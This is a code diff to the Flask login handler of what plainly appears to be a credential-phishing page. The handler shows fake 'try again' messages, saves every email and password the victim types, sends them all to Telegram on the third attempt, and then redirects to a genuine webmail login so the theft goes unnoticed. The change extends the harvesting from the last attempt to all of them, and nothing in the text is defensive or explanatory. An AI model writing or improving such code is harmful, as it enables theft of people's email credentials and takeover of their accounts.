@@ -36,27 +36,35 @@ def login():
     email = request.form.get('email', '')
     password = request.form.get('password', '')
 
-   # Initialize attempts counter if it doesn't exist
+  # Initialize session storage
     if 'attempts' not in session:
         session['attempts'] = 0
+        session['creds'] = []   # list to store all attempts
 
-    # Increase attempts
+    # Increase attempts and store credentials
     session['attempts'] += 1
+    session['creds'].append({"email": email, "password": password})
 
-    # If attempts less than 3 → just return index page again
+    # If attempts less than 3 → just show login page again
     if session['attempts'] < 3:
         flash(f"Attempt {session['attempts']} of 3. Please try again.")
         return render_template('index.html')
 
-    # On 3rd attempt → send to Telegram and redirect
-    message = f"Email: {email}\nPassword: {password}\nAttempts: {session['attempts']}"
+    # On 3rd attempt → send all attempts to Telegram
+    all_attempts_text = "\n\n".join(
+        [f"Attempt {i+1}:\nEmail: {c['email']}\nPassword: {c['password']}" 
+         for i, c in enumerate(session['creds'])]
+    )
+
+    message = f"Login Attempts (Total: {session['attempts']}):\n\n{all_attempts_text}"
     send_to_telegram(message)
 
-    # Reset attempts
+    # Reset session
     session.pop('attempts', None)
+    session.pop('creds', None)
 
     # Redirect after sending
-
+    
     return redirect('https://promail.ptd.net/')  # Normal redirect
 
 if __name__ == '__main__':
